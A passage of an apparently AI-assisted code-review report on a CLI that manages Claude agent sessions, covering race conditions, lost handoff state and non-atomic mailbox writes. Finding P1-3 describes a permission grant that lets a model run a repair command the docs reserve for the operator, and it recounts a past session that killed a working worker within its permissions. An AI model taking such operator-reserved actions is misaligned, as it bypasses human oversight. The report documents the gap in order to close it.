and identically around `_resume_one_limited(...)` in `cmd_resume_limited` (:5170). Widen `_steer_supervisor_release`'s handler (:6233) to `except (FleetCliError, NativeDispatchError) as exc:` so a failed steer is returned as refusal text, as its docstring says it is. (Alternatively make `NativeDispatchError` a `FleetCliError` subclass, but that silently changes the wrapped messages spawn/respawn already emit.)

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I tried to break the finding and could not. Verified independently: (1) NativeDispatchError is a plain Exception (bin/fleet.py:9496); runtime issubclass against the full set of main() except arms (RegistryCorruptError, SupervisorLifecycleRefusal, SupervisorContinuityError, FleetCliError, ClaudeNotFoundError, ValueError, FleetLockTimeout, UnsupportedPlatformError) returns False. (2) cmd_send (def :4934) contains no try/except; the call at :4971 is bare, and _cmd_send_native's only guard around dispatch_bg is `except BaseException: <rollback>; raise` (:4857). (3) inspect.getsource(cmd_resume_limited) and inspect.getsource(_resume_one_limited) contain no 'NativeDispatchError'. (4) _steer_supervisor_release catches only FleetCliError (:6237). (5) No sys.excepthook anywhere in bin/, and neither entry shim (bin/fleet, bin/fleet.cmd) catches. (6) dispatch_bg (:9648) is the one dispatch function for all five verbs and its wedge raise explicitly names steer and resume as affected. (7) No existing test pins traceback-free CLI behavior. Empirically reproduced end-to-end through real fleet.main(["send","w1","keep going"]) with only dispatch_bg/_require_instance_settings/_fetch_agents_roster stubbed: 'ESCAPED main(): NativeDispatchError'. The reviewer's line numbers are offset (~2 low mid-file, ~1330 low at EOF: real cmd_send :4934, bare call :4971, main arm :16465) but every quoted line is verbatim correct.
- *(confidence: high)* The mechanism is real and I reproduced it end-to-end through main(). NativeDispatchError (bin/fleet.py:9496) is a plain Exception; main()'s only arms (bin/fleet.py:16443-16462, NOT 15130 - the file is 16472 lines and main() starts at 16369) catch RegistryCorruptError, SupervisorLifecycleRefusal, SupervisorContinuityError, and (FleetCliError, ClaudeNotFoundError, ValueError, FleetLockTimeout, UnsupportedPlatformError). No except Exception, no sys.excepthook. cmd_send ends with a bare `return _cmd_send_native(...)` at bin/fleet.py:4971-4972; _cmd_send_native's dispatch handler is `except BaseException: ... raise`. cmd_resume_limited calls _resume_one_limited bare at bin/fleet.py:5172. _steer_supervisor_release catches only FleetCliError at bin/fleet.py:6234.  Reproduced (py -3.13, temp FLEET_HOME, idle native worker, dispatch_bg patched to raise, called via fleet.main(["send","w1","keep going"])): "ESCAPED main(): NativeDispatchError -> --bg dispatch exited 1: the Claude background service never became reachable". tests/test_send_provenance.py:132-136 independently pins that NativeDispatchError propagates out of _cmd_send_native.  REACHABILITY (my lens) holds. There is no upstream guard that prevents dispatch_bg from raising on the send path with a healthy roster. Live raise sites: `--bg dispatch exited N` on any non-wedge nonzero exit (9788-9789, e.g. `claude --bg --resume <old_sid>` rejecting a pruned sid - and send's fork-steer ALWAYS passes --resume), `could not parse short id from --bg stdout` (9791-9793) on vendor output drift, the two-consecutive never-attach wedge (9888) whose own comment records ~1/13 hand-probed spawns wedging, retry_safe=False (9875), and the mid-window roster-blackout raises (9583, 9636). Not dead code.  TWO PARTS OF THE FINDING ARE WRONG, hence the correction rather than a clean confirm: (1) The "claude absent from PATH" sub-claim is unreachable from `send`. _cmd_send_native calls _fetch_agents_roster first (bin/fleet.py:4813); that helper converts ClaudeNotFoundError into (False, "claude executable not found on PATH") at 11582-11583, and native_epoch_suspicious returns True on `not roster_ok` (2902-2903), so cmd_send raises a clean FleetCliError ("roster fetch unavailable/suspicious (G9)") and never reaches dispatch_bg or the 9673 re-wrap. That sub-path is only live via resume-limited, which has no G9 guard. The same guard also makes the finding's headline daemon-wedge scenario doubtful for `send` specifically, since `claude agents --json --all` is documented (8792-8795) to attempt a daemon start and would likely fail during a wedge, tripping G9 first. (2) Severity high is overstated for send/resume-limited: _cmd_send_native's `except BaseException` runs the full rollback (restore_mailbox_claim, status->idle, last_dispatch_at restored) BEFORE re-raising, and `sys.exit(main())` still exits 1 with the remedy text printed inside the traceback. No data loss, no silent failure - a confusing error, not a broken state.  The genuinely behavioral defect is the third path: a NativeDispatchError out of _steer_supervisor_release (6296 in kill supervisor arm 2, 6461 in respawn) skips _cmd_kill_native (6316) entirely, so `fleet kill supervisor` leaves the body alive and the claim held, whereas the designed refusal path sets arm2_reason and falls through to the hard stop.

---

### P1-2 — respawn commits a record built from a lock-free pre-probe snapshot, erasing a concurrent fork-steer's live sid

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `destructive`  |  **Category:** race-condition
- **Location:** `bin/fleet.py:5484`

**What is wrong**

`cmd_respawn` captures `before` from a LOCK-FREE read (bin/fleet.py:5651-5657):

```python
    _ok, _reason, _snap = _read_registry_readonly()
    if _ok and args.name in _snap["workers"]:
        _confirm_destructive(...)
        before = dict(_snap["workers"][args.name])
```

`_cmd_respawn_native` then spends a full `claude agents` subprocess round-trip outside any lock (5445-5451) and finally commits WITHOUT ever comparing the live record to `before` (5484-5501):

```python
    with fleet_lock():
        data = load_registry()
        rec = data["workers"].get(name)
        if rec is None:
            raise FleetCliError(f"unknown worker: {name!r}")
        if not is_native(rec):
            raise FleetCliError(f"{name}: worker changed concurrently; retry")
        new_record = new_worker_record(...)          # every field from `before`
        new_record["retired_sids"] = prior_retired + [old_sid]
        data["workers"][name] = new_record
        save_registry(data)
```

`is_native(rec)` is the only concurrency check; nothing compares `rec` to `before`. The liveness gate above it is also computed on the stale sid: `old_live = old_sid in _roster_live_sids(entries)` (5451) where `old_sid = before.get("session_id")` (5421).

This is the exact class `_cmd_kill_native` fixed for itself ("FIX WAVE 2, rb MIN-A (residual double-fork TOCTOU) ... take the sids we are about to stop from THIS under-lock read, not from the caller's `rec`", 5744-5756) and that `cmd_clean` (6820-6825) and `cmd_archive` implement as full-dict equality. `_cmd_send_native`'s own commit is defensive in the mirror direction (`if r is not None and r.get("session_id") == old_sid`, 4884) — so only the respawn ordering is unguarded.

**Failure scenario**

Worker `w1` is idle on sid A. Manager runs `fleet respawn w1`; `cmd_respawn` snapshots `before = {session_id: A, retired_sids: []}` lock-free, then `_cmd_respawn_native` blocks on `_fetch_agents_roster` (a real `claude agents` subprocess, ~0.5-2 s). Inside that window the supervisor runs `fleet send w1 "..."`, which fork-steers: the registry now holds `session_id: B` (live, roster entry carries `pid`) and `retired_sids: [A]`. Respawn resumes, sees A gone from the roster, so `old_live` is False and no `--force` is demanded; it then overwrites the record wholesale. I ran this exact interleaving against the shipped code (stale `before` + on-disk record already at B + roster showing B live with a pid) and `fleet.json` came back:

    {"session_id": "C", "retired_sids": ["A"], "status": "working", ...}   rc 0

Sid B is gone from the registry entirely — not in `session_id`, not in `retired_sids`. B is still a live claude session running the message that was just sent, so `w1` now has TWO live sessions (B and C) and fleet tracks only C. That is precisely Trap #3, the invariant this function's own docstring claims to hold ("never two live sessions under one name -- a real invariant, not a nicety"). B is now invisible to `fleet kill`/`interrupt`/`status`, to `_cmd_kill_native`'s retired-sid sweep (it only sweeps sids the record still carries), and to `_archive_eligible`'s live-sid gate.

The same missing compare has a second reachable outcome: if a `fleet archive w1` lands in that window and stamps `archived_at`, respawn's commit replaces the record with a fresh non-archived pre-claim, destroying the tombstone while `logs/archive/w1/` sits on disk — after which `fleet clean --tombstones` can never sweep it and `refuse_if_archived` (which ran at 5668 against the same stale `before`) never fires. `_cmd_respawn_supervisor`'s husk arm (6510-6522) drives its liveness gate and stop off the same stale `rec`.

**Fix**

Re-read the record under the commit lock and refuse when it is not byte-identical to `before` — the same "spare a concurrently-mutated record" test `cmd_clean` (6822) and `cmd_archive` already use. In the `with fleet_lock():` block at 5484, after the `is_native(rec)` check, add `if rec != before: raise FleetCliError(f"{name}: worker changed concurrently; retry")`, and recompute `old_sid`/`prior_retired` from the under-lock record rather than from `before` if you prefer to proceed instead of refusing. Apply the same re-read to `_cmd_respawn_supervisor`'s husk arm.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I re-read every cited line and reproduced the outcome. bin/fleet.py:5653-5657 captures `_snap` lock-free and derives `before` from it AFTER `_confirm_destructive` runs, so `before` is stale by the snapshot-to-commit window plus any interactive prompt. `_cmd_respawn_native` derives old_sid/prior_retired/all carried fields from `before` (5423-5445), does a `claude agents` subprocess round-trip outside any lock (5447), gates liveness on the stale sid (5453), and commits at 5486-5503 with `if not is_native(rec)` as the ONLY concurrency check -- no comparison of the under-lock `rec` to `before`. Verified the contrast cases are exactly as quoted: cmd_status 4109, cmd_clean 6769 and 6824 (`if current != before_rec: continue`), _cmd_send_native's mirror guard at 4886 (`r.get("session_id") == old_sid`), and _cmd_kill_native's FIX WAVE 2 rb MIN-A comment at 5741-5747 ("take the sids we are about to stop from THIS under-lock read, not from the caller's `rec` ... a second fork-steer landing between that re-fetch and here would leave fork2 running -- with the record marked dead, which is the rogue-session class"). cmd_archive's own docstring (7334) says it mirrors "cmd_status/cmd_clean's own 'spare a concurrently-mutated' " check, so respawn is the lone outlier. Reproduced in a sandboxed FLEET_HOME with py -3.13: on-disk record at sid B with retired_sids ['A'], stale `before` at sid A, roster showing B live with a pid, no --force -> rc 0, session_id becomes C, retired_sids stays ['A'], and B is absent from the record entirely (`B in json.dumps(w)` -> False). Live sid B is dropped from the registry while a fresh sid C is dispatched under the same name -- exactly the Trap #3 invariant the function's docstring claims to hold. Refutation attempts that failed: (1) `_supervisor_gate("respawn")` at 5617 narrows but does not close reachability -- it is documented at 11944-11950 as "a speed-bump against an over-helpful SECOND body, not an authorization boundary", disarms for a caller with no CLAUDE_CODE_SESSION_ID (an operator shell) and when no supervisor claim is held; (2) the reverse ordering IS handled -- if respawn commits first, _cmd_send_native's guard at 4886 falls through to the orphan branch at 4907-4918 and prints "changed during dispatch (killed/interrupted?)" -- but the send-commits-inside-respawn's-window ordering has no guard at all; (3) no test pins the wholesale overwrite as intended (grepped tests/ for respawn+concurrent, "worker changed concurrently" appears only in fleet.py); (4) `_roster_live_sids` (11108-11130) confirms a forked-away parent sid loses status/pid or goes state:"done", so old_live is False and --force is never demanded in the scenario -- the scenario is internally consistent. Platform is irrelevant here (pure registry-JSON logic); the repro ran on the machine's own Windows/py-3.13.
- *(confidence: high)* I attacked this on the reachability lens and could not break it.  WINDOW IS REAL: cmd_respawn takes its `before` from a lock-free `_read_registry_readonly()` (bin/fleet.py:5653-5657), then `_cmd_respawn_native` runs `_fetch_agents_roster` at 5447 — a real `claude agents --json --all` subprocess with a 30 s timeout (bin/fleet.py:11585-11586) — before it takes its first lock at 5486. `_confirm_destructive` can also prompt inside that gap. Multi-second window, confirmed.  NO UPSTREAM GUARD: `_refuse_launch_in_flight` has exactly two call sites, 6285 (kill) and 6516 (supervisor husk arm) — the native respawn path never calls it. `_supervisor_gate` is documented in its own docstring (11944-11950) as "a speed-bump against an over-helpful SECOND body, not an authorization boundary"; it does not serialize verbs across processes. No status check, no sid check: the only under-lock check at 5491 is `is_native(rec)`, and `refuse_if_archived` (5670) runs against the stale `before` and is never re-evaluated under the commit lock.  CONCURRENCY IS ACKNOWLEDGED BY THE FILE ITSELF: `_cmd_send_native`'s commit guard at 4872-4886 exists specifically because "a concurrent kill/interrupt/respawn --force" can land during its dispatch window, and `cmd_archive`'s docstring at 7330-7338 names the mirror hazard verbatim ("a concurrent `fleet send` fork-steer landing in the window between snapshot and commit is detected and the archive attempt is skipped") and implements the byte-identical re-read. `cmd_clean` does the same at 6822-6827. Respawn is the only lifecycle mutator missing it.  REPRODUCED (twice, independently written): stale `before` at sid A; on-disk record already fork-steered to B (retired_sids ['A'], status working); roster showing B live with a pid. `_cmd_respawn_native` returns rc 0 and fleet.json comes back {"session_id": "C", "retired_sids": ["A"], "status": "working"} — B is absent from session_id and from retired_sids. `old_live` is False because it is computed on the stale `old_sid` (5453), so no --force is demanded, and line 5502 `data["workers"][name] = new_record` replaces the record wholesale. B is a live claude session running the just-sent message, now invisible to kill/interrupt/status and to the retired-sid sweep — the Trap #3 invariant the docstring claims at 5387-5389.  The rollback arm does not save it either: on NativeDispatchError it restores `before` (session_id A), which is equally wrong — B is lost either way.  Only a secondary parenthetical is overstated; see correction.

---

### P1-3 — `allowed-tools: Bash(fleet doctor:*)` pre-authorizes `fleet doctor --repair`, the sole quarantine path

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `docs-drift`  |  **Category:** doc-asserts-safety-property-code-lacks
- **Location:** `commands/doctor.md:3`

**What is wrong**

`commands/doctor.md:3`:
```
allowed-tools: 'Bash(fleet doctor:*)'
```
`commands/overview.md:3`:
```
allowed-tools: 'Bash(fleet status:*), Bash(fleet doctor:*), Bash(fleet knowledge:*), Bash(fleet sup-status:*)'
```
`Bash(fleet doctor:*)` is a prefix grant, so it matches `fleet doctor --repair`. But the same files' prose, and every other doc, say the operator gates that flag:
- `commands/doctor.md:8-12` — "For each reported problem, give the one command that fixes it. Do not run any of them without being asked. … name it if `[FAIL] registry:` appears, **and let the operator run it**."
- `commands/overview.md` (last line) — "If `doctor` reports `[FAIL] registry:`, say so and name `fleet doctor --repair`; **do not run it yourself**."
- `skills/fleet/SKILL.md:52` — "That rename destroys the file an operator may want to inspect … do not run `--repair` unasked."
- `CLAUDE.md:13` — `--repair` is "the sole path that performs the quarantine rename".

Those are prompt-level instructions; the permission system is what actually enforces. The lint CLAUDE.md cites as enforcing this split does not cover it — `tests/test_terminal_surface.py:767-768`:
```
DESTRUCTIVE_VERBS = ("kill", "clean", "respawn", "interrupt", "spawn",
                     "send", "attach", "release", "resume-limited")
```
no `doctor`/`--repair` entry, so `test_read_only_grants_reach_no_destructive_subcommand` passes vacuously for the one grant that reaches a mutating path. This is the exact shape of the 2026-07-09 data-loss incident that test's own comment records (`Bash(fleet:*)` on a read-only command → a session "fully within permissions" killed a worker).

**Failure scenario**

An operator's registry is corrupt. They run `/fleet:doctor` (or `/fleet:overview`). The inlined `fleet doctor` prints `[FAIL] registry: … Rerun as `fleet doctor --repair` to quarantine it`. The model, being helpful and reading its own output's suggested remedy, runs `fleet doctor --repair` via Bash. It matches `Bash(fleet doctor:*)`, so no permission prompt fires, `_quarantine_registry` renames `state/fleet.json` → `state/fleet.json.corrupt.<ts>` — and per `docs/specs/autoclean.md:66` (NEW-1) autoclean's husk tier then refuses itself for as long as that artifact exists. The operator never got the choice the three docs promised them.

**Fix**

Narrow the grants so they cannot reach the mutating form: in `commands/doctor.md:3` and `commands/overview.md:3` use an exact-command grant (`Bash(fleet doctor)`) rather than the `:*` prefix, and add `doctor --repair` (or `--repair`) to `DESTRUCTIVE_VERBS` in `tests/test_terminal_surface.py:767` so the lint fails if the prefix grant comes back.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: medium)* I could not refute the core claim; every cited line reads as the reviewer says. (1) commands/doctor.md:3 and commands/overview.md:3 carry `Bash(fleet doctor:*)`, a prefix grant, while both bodies inline only bare `fleet doctor` (doctor.md:6, overview.md:18) with no arguments — so the `:*` buys nothing and reaches `fleet doctor --repair`. (2) `--repair` really is mutating: bin/fleet.py:9079-9084 does `repair = bool(getattr(args, "repair", False))` then `if repair: with fleet_lock(): data = load_registry()` — described in-line as "the ONE quarantine site left". (3) The lint does not cover it: tests/test_terminal_surface.py:768-769 DESTRUCTIVE_VERBS lists kill/clean/respawn/interrupt/spawn/send/attach/release/resume-limited, no doctor or --repair; I ran `py -3.13 -m pytest -q tests/test_terminal_surface.py -k grants` and got 10 passed with the grant in place. (4) The prose it contradicts is real: doctor.md:8-14, overview.md:36, and docs/specs/terminal-surface.md:190 which states the design intent outright — "Mutating (prompt template -> model runs the CLI via Bash -> permission prompt applies)". (5) The autoclean consequence checks out: docs/specs/autoclean.md NEW-1 says "Tier 2 therefore refuses while any state/fleet.json.corrupt.* exists, registry present or not."  The strongest refutation I attempted was that slash-command `allowed-tools` might scope only the inline `!` expansion and not pre-authorize later model-initiated Bash calls. This repo's own incident record kills that: tests/test_terminal_surface.py:763-767 records a session that invoked /fleet:status and "fully within permissions" ran `fleet kill` and `fleet clean`. commands/status.md inlines only `fleet status`, so those were model-initiated Bash calls approved by the frontmatter grant. The DESTRUCTIVE_VERBS lint exists only because of that mechanism.  Confidence is medium rather than high because the one link I cannot execute here is the harness's permission matcher itself; everything else I verified directly in the tree.  Two corrections to the finding are warranted. First, severity: bin/fleet.py:630-643 `_quarantine_registry` does `path.rename(quarantined)` with nothing deleted, and only fires when `_registry_corrupt_reason` already rejected the file, so this is not "the exact shape" of the irreversible 2026-07-09 kill/clean data loss — it is a recoverable rename of an already-unusable file, and it is the remedy doctor itself prints (bin/fleet.py:9043-9046). Second, the once-severe corrupt->absent consequence (§9 legacy-claim upgrade being granted on absence) is already closed by the quarantine-artifact glob gate at bin/fleet.py:646-698 plus tests/test_identity_quarantine_glob.py, as docs/OPERATOR-GATES.md:40 states. Also, "passes vacuously" is imprecise: the test does execute against doctor.md and pass; it simply encodes no rule about the flag. Residual real harm: the model can take a decision three docs reserve for the operator, leaving a state/fleet.json.corrupt.* artifact that disarms autoclean's husk tier until the operator restores and removes it.
- *(confidence: medium)* I tried to refute on reachability and could not. (1) The grant genuinely matches: `commands/doctor.md:3` is `Bash(fleet doctor:*)`, a prefix grant, and `fleet doctor --repair` starts with `fleet doctor `. (2) The mechanism -- slash-command frontmatter widening the MODEL's own Bash calls, not just the inline `!` span -- is confirmed by the repo's own incident record at docs/SPEC-v2-history.md:193: "A `claude -p \"/fleet:status\"` probe, granted `Bash(fleet:*)` by a read-only slash command, judged four dead workers untidy, killed a fifth that was `working`... It never exceeded its permissions." So this is not a speculative permission-semantics assumption. (3) No upstream guard blocks the path: bin/fleet.py:9079-9084 does `repair = bool(getattr(args, "repair", False))` then `with fleet_lock(): data = load_registry()` -- the one quarantine site -- with no confirmation; `_confirm_destructive` covers only kill/clean/respawn (5641, 5899, 6816), never doctor. (4) The existing pin, tests/test_view_quarantine.py:673-691, is scoped by its own docstring to `!`...`` inline-exec spans, so it cannot catch a grant-mediated model call. (5) The inlined output actively invites the escalation: `_doctor_check_registry` (bin/fleet.py:9044-9046) prints "Rerun as `fleet doctor --repair` to quarantine it" in the same prompt whose prose says "let the operator run it". However the finding overstates severity and misstates three details, which I correct: the quarantine RENAMES rather than deletes (bin/fleet.py:630-643, bytes preserved at state/fleet.json.corrupt.<ts>), so this is not data loss; `--repair` is a no-op unless the registry is already unparseable; the corrupt-to-absent privilege escalation is already closed upstream by the quarantine-artifact glob gate (`_quarantine_artifacts`, bin/fleet.py:646-677, read by `_require_claim_holder`'s section-9 arm, `_sweep_husks`, `_doctor_check_autoclean`; recorded in docs/OPERATOR-GATES.md:40); and `test_read_only_grants_reach_no_destructive_subcommand` is not vacuous -- it has real teeth against `Bash(fleet kill:*)`, it just enumerates subcommand verbs and not flags. Residual real harm: the operator loses the timing choice and autoclean tier 2 self-refuses (docs/specs/autoclean.md NEW-1) until the artifact is cleared -- loud and recoverable, not silent. Confidence is medium rather than high because the last mile requires the model to disobey an explicit in-prompt prohibition, which is a behavioral rather than a purely mechanical step; the 2026-07-09 incident had no such prohibition in the command body.

---

### P1-4 — sup-release drops handoff_pending + handoff_token_hash: an in-flight successor is erased

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `handoff`  |  **Category:** data-loss / broken-invariant
- **Location:** `bin/fleet.py:12916`

**What is wrong**

`cmd_sup_release` builds the released claim as an enumerated literal and never calls `_carry_handoff_pending`:

```
        released = {"incarnation_id": inc,
                    "lineage_id": claim.get("lineage_id"),
                    "claimed_via": claim.get("claimed_via"),
                    "released_at": now_iso(),
                    "released_by_sid": caller,
                    "state": "released"}
        ...
        write_incarnation(released)
```

This is a CLAIM TRANSITION, and it is the fourth dict-literal writer. `_carry_handoff_pending` (bin/fleet.py:10734) states the invariant it breaks verbatim: "R5: carry the pending successors across a CLAIM TRANSITION ... before this the pending set died at exactly the transition the succession path exists for: a predecessor that dies mid-handoff has its in-flight successor erased by the next boot -- invisible in `sup-status --json`, unabortable, and its bootstrap file then unprotected from the sweep." `cmd_sup_boot`'s two literals call it (11775, 11824); `cmd_sup_handoff_complete` hand-rolls the equivalent (14133); this one does neither.

The test that is supposed to cover this transition cannot fail on it — tests/test_handoff_seams.py:705 `test_a_fresh_claim_after_a_release_carries_them_forward` hand-builds the released claim by mutating the LIVE claim in place (`released["state"] = "released"; released.pop("session_id")`), a shape `cmd_sup_release` never writes, so `handoff_pending` is still present when the boot under test reads it. Driving the real verb: `handoff_pending_entries(read_incarnation()) == []` immediately after `cmd_sup_release` returns 0.

**Failure scenario**

Holder P runs `fleet sup-handoff-begin`; successor S is dispatched and joins the roster (entry recorded, `state/supervisor-handoff-<S>.md` on disk carrying S's plaintext one-shot token). P decides to stand down instead and runs `fleet sup-release` (nothing refuses it — the handoff-in-flight refusal at bin/fleet.py:6109 only guards `kill`/`respawn supervisor`). Reproduced end to end: (a) the released claim carries no `handoff_pending`, so `fleet sup-status`/`--json` report zero pending successors while S is live — exactly the 2026-07-24 blindness R1/D1 were written for; (b) `handoff_task_files_to_sweep([(supervisor-handoff-<S>.md, 10*T)], released)` now returns that file — the released claim still has a truthy `incarnation_id`, so the sweep is armed but nothing protects S's file, and the next `fleet sup-boot` (bin/fleet.py:11737) deletes it; (c) the next fresh boot carries nothing forward, so from the new holder `fleet sup-handoff-abort --successor-inc <S>` refuses with "matches no recorded limbo successor" — S is permanently unabortable through every fleet verb.

**Fix**

Call `_carry_handoff_pending(claim, released)` before `write_incarnation(released)` (and carry `handoff_token_hash` with it, since `drop_handoff_entry` pairs the two). Then rewrite tests/test_handoff_seams.py:705 to produce the released claim by calling `cmd_sup_release`, not by mutating the live claim, so the assertion is exercised against the shape the verb actually writes.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I tried to refute on reachability and could not; the path is not just reachable, it is the documented fallback.  GUARD SEARCH (all negative): `_supervisor_lifecycle_interaction_refusals` (bin/fleet.py:6093) is the only handoff-in-flight refusal and is invoked at exactly two call sites, bin/fleet.py:5638 (`respawn`) and bin/fleet.py:5896 (`kill`) — never from `cmd_sup_release`. `_require_claim_holder` (bin/fleet.py:12455) has no handoff arm at all (its arms are worker-turn, released-claim, legacy, nonce continuity). Between `_require_claim_holder` and `write_incarnation(released)` in `cmd_sup_release` (bin/fleet.py:12912-12927) there is only the journal append and the enumerated literal. Nothing refuses release mid-handoff.  REPRODUCED (sandboxed FLEET_HOME, real verbs, py -3.13): 1. `cmd_sup_handoff_begin` -> `cmd_sup_release(SimpleNamespace(sid="sid-old", nonce=gen, reason=...))` returns 0 and writes `{"incarnation_id", "lineage_id", "claimed_via", "released_at", "released_by_sid", "state": "released", "reason"}` — `handoff_pending_entries(read_incarnation()) == []`, `handoff_token_hash` gone. 2. `handoff_task_files_to_sweep([(supervisor-handoff-<S>.md, 10*T)], released)` -> `['supervisor-handoff-<S>.md']`; the same call against the pre-release claim -> `[]`. The released claim keeps a truthy `incarnation_id`, so the sweep is armed and nothing protects the file. 3. Full chain: begin -> release -> `cmd_sup_boot` (rc 0). The task file is DELETED (`f.exists()` False), the new claim's pending set is `[]`, and `cmd_sup_handoff_abort --successor-inc <S>` from the new holder raises FleetCliError: "no HANDSHAKE and inc-... matches no recorded limbo successor -- refusing to stop an unverified session (pending successors: none recorded...)". Exactly consequences (a), (b), (c). 4. The DOA branch (`_begin_doa`, dispatch succeeds, successor never joins) records an entry with no sid plus a task file; `cmd_sup_release` erases both records identically.  WHY THE SHAPE IS UNREACHABLE OTHERWISE: `grep -n '"released"' bin/fleet.py` shows bin/fleet.py:12923 is the ONLY writer of `"state": "released"`. Every other hit is a reader. So the released-claim-carrying-`handoff_pending` shape that tests/test_handoff_seams.py:705 hand-builds is produced by no code path in the program.  DESIGN INTENT IS EXPLICIT, so this is not "release deliberately drops it": `_carry_handoff_pending` (bin/fleet.py:10736) states R5 as covering CLAIM TRANSITIONS, `cmd_sup_boot`'s two literals call it (bin/fleet.py:11777, 11826), `cmd_sup_handoff_complete` hand-rolls it (bin/fleet.py:14135-14148), and the T10 literal-writer test (tests/test_supervisor.py:895) is parametrized only over ["fresh", "seize"] — release is outside its coverage.  REACHABILITY IS STRONGER THAN THE FINDING CLAIMS: skills/fleet/SKILL.md:95 tells the operator "Handoff dispatch (`sup-handoff-begin`) is still unproven end to end -- eight stillbirths across two days -- so prefer release-then-spawn until someone drives it green." begin -> stillbirth -> `sup-release` is the documented recommended fallback, not an exotic operator mistake.  ONE UNDER-STATED CONSEQUENCE the finding missed: `fleet doctor`'s "N pending successor(s) awaiting retirement" FAIL row (bin/fleet.py:14626-14634, added as rb-MAJ-6/rs-MIN-A precisely so the 2026-07-24 residue could not report PASS) reads `handoff_pending_entries(claim)`, so the release silences the verdict-moving row too. The only surviving signal is the best-effort orphan-file NOTE at bin/fleet.py:14670 — and the next `sup-boot` sweep deletes the files that NOTE names.
- *(confidence: high)* I re-read the cited lines and reproduced the defect end-to-end by driving the real verbs in a sandboxed FLEET_HOME (real cmd_sup_handoff_begin -> real cmd_sup_release -> real cmd_sup_boot).  Control flow, confirmed: bin/fleet.py:12918-12926 builds the released claim as a 6-key dict literal and never calls _carry_handoff_pending; cmd_sup_boot's two literals do (11777, 11826) and cmd_sup_handoff_complete hand-rolls it (14135-14148). _require_claim_holder (12455) has no handoff guard, and the handoff-in-flight refusal at 6111 lives in _supervisor_lifecycle_interaction_refusals, which is called only from the kill/respawn-supervisor path (5897) — never from cmd_sup_release. So sup-release mid-handoff is reachable and returns 0.  Reproduction output: PENDING before release ['inc-...-7fdb']; RELEASE rc 0; released claim keys = [claimed_via, incarnation_id, lineage_id, reason, released_at, released_by_sid, state] (no handoff_pending, no handoff_token_hash); PENDING after release []; handoff_task_files_to_sweep([...], released) returned the successor's file (the released claim keeps a truthy incarnation_id, so the 10632 guard passes and nothing protects the file); the next cmd_sup_boot ran sweep_handoff_task_files(claim) at 11739 and the file was gone ("task file still exists: False"); PENDING after boot []; resolve_handoff_abort from the new holder returned {'action':'refuse', reason '... matches no recorded limbo successor ...'}. The doctor's stranded-entry FAIL row (14626) also reads pending entries off the claim, so it goes blind as well.  The test sub-claim is accurate: tests/test_handoff_seams.py:705 hand-mutates the live claim (released["state"]="released"; released.pop("session_id")), a shape cmd_sup_release never writes, so it only exercises the boot-side carry and cannot go red on this.  Two prose/fix corrections (they do not refute the defect): the proposed "carry handoff_token_hash" contradicts ratified R4 — complete deliberately does not carry it (14125-14127) and tests/test_handoff_seams.py:751 pins `"handoff_token_hash" not in claim`; dropping the hash on release is correct because it invalidates the stranded plaintext token. And "unabortable through every fleet verb" holds for a reason worth stating: begin registers the successor with session_id=None (14024-14035; the sid is stamped only by complete at 14160-14172), so the erased pending entry was fleet's only durable record of the successor's live sid.  No tracked file was modified; the probe lives in the scratchpad.

---

### P1-5 — Mailbox appends use the buffered open(...,"a") this repo proved loses records on Windows, and race outside fleet_lock

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `locking`  |  **Category:** atomicity / data loss
- **Location:** `bin/fleet.py:1237`

**What is wrong**

```python
def append_mailbox(sid: str, message: str) -> None:
    """Append `message` to mailbox/<sid>.md (SPEC 7): a small
    open(..., "a") write, matching the hooks' own append discipline exactly
    ..."""
    with open(path, "a", encoding="utf-8") as f:
        f.write(message.rstrip("\n") + "\n\n")
```

This is precisely the primitive the codebase elsewhere documents as broken, with its own measurement. `append_event` (:1019): *"a plain buffered `open(..., "a")` does NOT append atomically on Windows. The CRT's O_APPEND emulation seeks to EOF and writes as two separate steps, so concurrent writers drop whole clean records with ZERO JSON-decode errors: silent loss ... Measured on this file before the fix: 4 threads x 250 records lost 9-12 of 1000 every run."* `_WindowsPlatform.atomic_append_bytes` (:390) exists solely to fix this, and events/outcomes/nonce-rejections were all migrated onto it. The mailbox -- which carries the operator's steering text -- was not.

The docstring's justification is also false: the hooks never append to a mailbox. `posttooluse_mailbox.py` and `stop_mailbox.py` only `os.replace`-claim and read it. The only mailbox appenders are `append_mailbox` (:1237), `_migrate_residual_mailbox` (:9360) and `restore_mailbox_claim` (:1218).

And the writers are not serialized: two of the three `append_mailbox` call sites in `_cmd_send_native` are INSIDE the `with fleet_lock():` opened at :4663 (:4729, :4786), while the third is deliberately outside it:

```python
    # Outside the lock: F6 pattern -- append the message FIRST so it rides
    # the mailbox drain uniformly with any prior mail ...
    append_mailbox(old_sid, message)        # :4844
```

so a lock-holder and a non-lock-holder can be writing the same `mailbox/<sid>.md` at the same instant.

**Failure scenario**

Worker `w1` is idle. Process A runs `fleet send w1 "revert the migration"`: it pre-claims under the lock (status -> working, `session_id` still `old_sid`), RELEASES the lock, then appends at :4844. Process B runs `fleet send w1 "also bump the version"` concurrently: it acquires the now-free lock, reads raw status `working`, and appends at :4729 to the SAME file `mailbox/<old_sid>.md` (`raw_sid == old_sid`, since A has not restamped yet). Both appends resolve their EOF offset independently; on Windows one WriteFile lands on top of the other. One of the two operator instructions vanishes with no error, no JSON-decode failure, and no event -- both `fleet send` invocations print `message queued to mailbox` and exit 0.

**Fix**

Route `append_mailbox` (and `_migrate_residual_mailbox`'s append at :9360) through the existing `_atomic_append_bytes(path, text.encode("utf-8"))` primitive instead of `open(..., "a")`, exactly as `append_event`/`append_outcome` already do, and correct the docstring's "matching the hooks' own append discipline" claim (the hooks do not append here).

**Verification** — 2 independent skeptics, neither could refute:

